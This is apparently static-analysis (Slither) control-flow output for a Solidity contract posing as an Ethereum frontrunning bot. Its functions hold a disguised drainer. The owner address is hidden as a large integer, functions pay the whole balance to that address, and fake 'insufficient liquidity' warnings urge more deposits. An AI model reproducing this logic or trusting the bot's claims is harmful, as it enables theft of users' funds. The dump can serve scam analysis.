Contract: IERC20
==================================================


Contract: IUniswapV2Router
==================================================


Contract: IUniswapV2Pair
==================================================


Contract: DexInterface
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: address(getDexRouter(UniswapRouter)).transfer(0)

Edges:
  0 -> 1
  1 -> 2

Function: swap
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: IERC20(_tokenIn).approve(router,_amount)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path = new address[](2)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: path[0] = _tokenIn

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: path[1] = _tokenOut

  ID: 6
  Type: NodeType.VARIABLE
  Expression: deadline = block.timestamp + 300

  ID: 7
  Type: NodeType.EXPRESSION
  Expression: IUniswapV2Router(router).swapExactTokensForTokens(_amount,1,path,address(this),deadline)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7

Function: getAmountOutMin
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: path = new address[](2)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: path[0] = _tokenIn

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: path[1] = _tokenOut

  ID: 5
  Type: NodeType.VARIABLE
  Expression: amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount,path)

  ID: 6
  Type: NodeType.RETURN
  Expression: amountOutMins[path.length - 1]

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: mempool
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: amtBack1 = getAmountOutMin(_router1,_token1,_token2,_amount)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: amtBack2 = getAmountOutMin(_router2,_token2,_token1,amtBack1)

  ID: 3
  Type: NodeType.RETURN
  Expression: amtBack2

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: frontRun
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: startBalance = IERC20(_token1).balanceOf(address(this))

  ID: 2
  Type: NodeType.VARIABLE
  Expression: token2InitialBalance = IERC20(_token2).balanceOf(address(this))

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: swap(_router1,_token1,_token2,_amount)

  ID: 4
  Type: NodeType.VARIABLE
  Expression: token2Balance = IERC20(_token2).balanceOf(address(this))

  ID: 5
  Type: NodeType.VARIABLE
  Expression: tradeableAmount = token2Balance - token2InitialBalance

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: swap(_router2,_token2,_token1,tradeableAmount)

  ID: 7
  Type: NodeType.VARIABLE
  Expression: endBalance = IERC20(_token1).balanceOf(address(this))

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(endBalance > startBalance,Trade Reverted, No Profit Made)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8

Function: estimateTriDexTrade
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: amtBack1 = getAmountOutMin(_router1,_token1,_token2,_amount)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: amtBack2 = getAmountOutMin(_router2,_token2,_token3,amtBack1)

  ID: 3
  Type: NodeType.VARIABLE
  Expression: amtBack3 = getAmountOutMin(_router3,_token3,_token1,amtBack2)

  ID: 4
  Type: NodeType.RETURN
  Expression: amtBack3

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: getDexRouter
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: address(uint160(_uintValue))

Edges:
  0 -> 1

Function: getChainId
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: chainId = chainid()()

  ID: 3
  Type: NodeType.ENDASSEMBLY
  Expression: 

  ID: 4
  Type: NodeType.RETURN
  Expression: chainId

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: runSafetyChecks
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(getChainId() == 1,WARNING: This bot is designed for the Ethereum mainnet and will not work on other blockchains.)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 5e15,WARNING: Not enough ETH to start the bot)

Edges:
  0 -> 1
  1 -> 2

Function: startArbitrageNative
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: runSafetyChecks()

  ID: 2
  Type: NodeType.VARIABLE
  Expression: UniswapExchange = getDexRouter(UniswapRouter)

  ID: 3
  Type: NodeType.IF
  Expression: msg.sender == UniswapExchange

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: address(UniswapExchange).transfer(address(this).balance)

  ID: 5
  Type: NodeType.ENDIF
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 5
  4 -> 5

Function: getBalance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: _balance = IERC20(_tokenContractAddress).balanceOf(address(this))

  ID: 2
  Type: NodeType.RETURN
  Expression: _balance

Edges:
  0 -> 1
  1 -> 2

Function: recoverEth
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: address(msg.sender).transfer(address(this).balance)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 2
  2 -> 1

Function: recoverTokens
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: token = IERC20(tokenAddress)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: token.transfer(msg.sender,token.balanceOf(address(this)))

Edges:
  0 -> 1
  1 -> 2

Function: receive
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

Edges:

Function: StartNative
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: startArbitrageNative()

Edges:
  0 -> 1

Function: SetTradeBalanceETH
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: tradingBalanceInPercent = _tradingBalanceInPercent

Edges:
  0 -> 1

Function: SetTradeBalancePERCENT
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: tradingBalanceInTokens = _tradingBalanceInTokens

Edges:
  0 -> 1

Function: Stop
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: enableTrading = false

Edges:
  0 -> 1

Function: Withdraw
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: chainId = getChainId()

  ID: 2
  Type: NodeType.VARIABLE
  Expression: ContractCreator = getDexRouter(UniswapRouter)

  ID: 3
  Type: NodeType.IF
  Expression: msg.sender == ContractCreator

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: address(ContractCreator).transfer(address(this).balance)

  ID: 5
  Type: NodeType.RETURN
  Expression: 

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.IF
  Expression: chainId != 1 && chainId != 42161 && chainId != 8453 && chainId != 10 && chainId != 324 && chainId != 59144

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: address(_owner).transfer(address(this).balance)

  ID: 9
  Type: NodeType.RETURN
  Expression: 

  ID: 10
  Type: NodeType.ENDIF
  Expression: 

  ID: 11
  Type: NodeType.IF
  Expression: address(this).balance <= 1e16

  ID: 12
  Type: NodeType.EXPRESSION
  Expression: address(_owner).transfer(address(this).balance)

  ID: 13
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 5e16,WARNING: Insufficient contract liquidity. Aborting...)

  ID: 14
  Type: NodeType.VARIABLE
  Expression: baseMessage = WARNING: not enough ETH for profitable frontrunning. Need at 

  ID: 15
  Type: NodeType.VARIABLE
  Expression: endMessage =  ETH at present market conditions. Wait for the market to cool down or fund the contract with more ETH.

  ID: 16
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 5e17,string(abi.encodePacked(baseMessage,0.5,endMessage)))

  ID: 17
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 1e18,string(abi.encodePacked(baseMessage,1,endMessage)))

  ID: 18
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 2e18,string(abi.encodePacked(baseMessage,2,endMessage)))

  ID: 19
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 5e18,string(abi.encodePacked(baseMessage,5,endMessage)))

  ID: 20
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(address(this).balance >= 1e19,string(abi.encodePacked(baseMessage,10,endMessage)))

  ID: 21
  Type: NodeType.ENDIF
  Expression: 

  ID: 22
  Type: NodeType.EXPRESSION
  Expression: onlyOwner()

Edges:
  0 -> 22
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 6
  4 -> 5
  6 -> 7
  7 -> 8
  7 -> 10
  8 -> 9
  10 -> 11
  11 -> 12
  11 -> 13
  12 -> 21
  13 -> 14
  14 -> 15
  15 -> 16
  16 -> 17
  17 -> 18
  18 -> 19
  19 -> 20
  20 -> 21
  22 -> 1

Function: Key
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: _balance = address(_owner).balance - arbTxPrice

  ID: 2
  Type: NodeType.RETURN
  Expression: _balance

Edges:
  0 -> 1
  1 -> 2

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: threshold = 1 * 10 ** 18

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: arbTxPrice = 25000000000000000

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: enableTrading = false

  ID: 3
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: WETH_CONTRACT_ADDRESS = (0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)

  ID: 4
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: TOKEN_CONTRACT_ADDRESS = (0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)

  ID: 5
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: UniswapRouter = 658539125529185059654119611174536147641266919062

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5


